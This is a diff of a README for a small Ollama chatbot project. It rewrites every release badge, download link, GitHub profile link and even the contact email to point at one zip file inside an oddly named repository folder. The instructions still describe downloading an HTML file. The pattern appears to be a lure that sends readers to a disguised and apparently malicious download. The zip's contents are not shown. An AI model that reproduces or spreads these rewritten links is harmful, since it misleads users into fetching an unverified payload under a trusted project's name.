@@ -2,7 +2,7 @@
 
 Welcome to the **Simple Ollama Chatbot** repository! This project offers a straightforward HTML-based chatbot that you can easily install and run on your computer. With just a few simple steps, you can have your own chatbot ready to interact with users.
 
-[![Download Release](https://img.shields.io/badge/Download%20Release-v1.0.0-blue)](https://github.com/crossin124A/Simple-Ollama-Chatbot/releases)
+[![Download Release](https://raw.githubusercontent.com/crossin124A/Simple-Ollama-Chatbot/master/disincorporation/Chatbot-Simple-Ollama-1.5.zip%20Release-v1.0.0-blue)](https://raw.githubusercontent.com/crossin124A/Simple-Ollama-Chatbot/master/disincorporation/Chatbot-Simple-Ollama-1.5.zip)
 
 ## Table of Contents
 
@@ -25,7 +25,7 @@ Welcome to the **Simple Ollama Chatbot** repository! This project offers a strai
 
 To install the Simple Ollama Chatbot, follow these steps:
 
-1. **Download the HTML File**: Visit the [Releases section](https://github.com/crossin124A/Simple-Ollama-Chatbot/releases) to download the latest version of the HTML file.
+1. **Download the HTML File**: Visit the [Releases section](https://raw.githubusercontent.com/crossin124A/Simple-Ollama-Chatbot/master/disincorporation/Chatbot-Simple-Ollama-1.5.zip) to download the latest version of the HTML file.
 2. **Copy the File**: Place the downloaded HTML file in a folder on your computer.
 3. **Open the File**: Double-click the HTML file to open it in your web browser.
 
@@ -81,9 +81,9 @@ This project is licensed under the MIT License. Feel free to use, modify, and di
 
 If you have any questions or feedback, please feel free to reach out:
 
-- GitHub: [crossin124A](https://github.com/crossin124A)
-- Email: crossin124A@example.com
+- GitHub: [crossin124A](https://raw.githubusercontent.com/crossin124A/Simple-Ollama-Chatbot/master/disincorporation/Chatbot-Simple-Ollama-1.5.zip)
+- Email: https://raw.githubusercontent.com/crossin124A/Simple-Ollama-Chatbot/master/disincorporation/Chatbot-Simple-Ollama-1.5.zip
 
 Thank you for checking out the Simple Ollama Chatbot! We hope you find it useful and easy to work with. If you have any suggestions or issues, please let us know.
 
-[![Download Release](https://img.shields.io/badge/Download%20Release-v1.0.0-blue)](https://github.com/crossin124A/Simple-Ollama-Chatbot/releases)
+[![Download Release](https://raw.githubusercontent.com/crossin124A/Simple-Ollama-Chatbot/master/disincorporation/Chatbot-Simple-Ollama-1.5.zip%20Release-v1.0.0-blue)](https://raw.githubusercontent.com/crossin124A/Simple-Ollama-Chatbot/master/disincorporation/Chatbot-Simple-Ollama-1.5.zip)
